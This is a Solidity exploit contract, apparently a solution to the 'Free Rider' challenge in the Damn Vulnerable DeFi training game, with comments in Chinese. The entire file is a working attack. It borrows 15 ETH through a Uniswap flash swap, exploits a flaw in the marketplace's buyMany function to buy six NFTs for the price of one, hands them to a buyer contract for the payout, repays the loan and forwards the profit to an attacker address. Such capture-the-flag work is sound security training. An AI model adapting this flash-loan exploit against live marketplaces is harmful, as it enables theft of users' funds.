// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "hardhat/console.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

import "../free-rider/FreeRiderNFTMarketplace.sol";
import "../free-rider/FreeRiderBuyer.sol";

interface IUniswap {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IWETH9 {
    function balanceOf(address who) external view returns (uint256);
    function deposit() external payable;
    function withdraw(uint amount) external;
    function transfer(address dst, uint wad) external returns (bool);
}

contract FreeRiderAttack is IERC721Receiver{
    address uniswapAddress;
    address tokenAddress;
    address freeRiderBuyerAddress;
    address marketAddress;
    address wETH9Address;
    uint loadAmount;
    uint[] tokenIds = [0, 1, 2, 3, 4, 5];
    function run(
                 address _attackAddress,
                 address _uniswapAddress,
                 address _tokenAddress, 
                 address _wETH9Address, 
                 address _freeRiderBuyerAddress, 
                 address _marketAddress
                 ) external
    {
        uniswapAddress = _uniswapAddress;
        tokenAddress = _tokenAddress;
        wETH9Address = _wETH9Address;
        freeRiderBuyerAddress = _freeRiderBuyerAddress;
        marketAddress = _marketAddress;
        //闪电贷借15 eth
        IUniswap(uniswapAddress).swap(15 ether, 0, address(this), new bytes(1));
        payable(_attackAddress).transfer(address(this).balance);
    }


    function uniswapV2Call(
                            address, 
                            uint amount0, 
                            uint, 
                            bytes calldata
                          ) external 
    {
        IWETH9(wETH9Address).withdraw(amount0);
        //buyMany的bug,付一个买6个
        FreeRiderNFTMarketplace(payable(marketAddress)).buyMany{value:15 ether}(tokenIds);
        DamnValuableNFT token = FreeRiderNFTMarketplace(payable(marketAddress)).token();
        //转nft给buyer换ETH还闪电贷
        for(uint i = 0; i < 6; i++) {
          token.safeTransferFrom(address(this),freeRiderBuyerAddress, i);
        }
        uint backAmount = amount0 + ((amount0 *3) / 997) + 1; //加上手续费0.3%
        IWETH9(wETH9Address).deposit{value:backAmount}();
        IWETH9(wETH9Address).transfer(uniswapAddress, backAmount);
    }

    function onERC721Received(
                              address,
                              address,
                              uint256,
                              bytes calldata
                             ) 
                             external 
                             override 
                             pure 
                             returns (bytes4)
    {    
        return IERC721Receiver.onERC721Received.selector;
    }    

    receive() external payable{}
}
 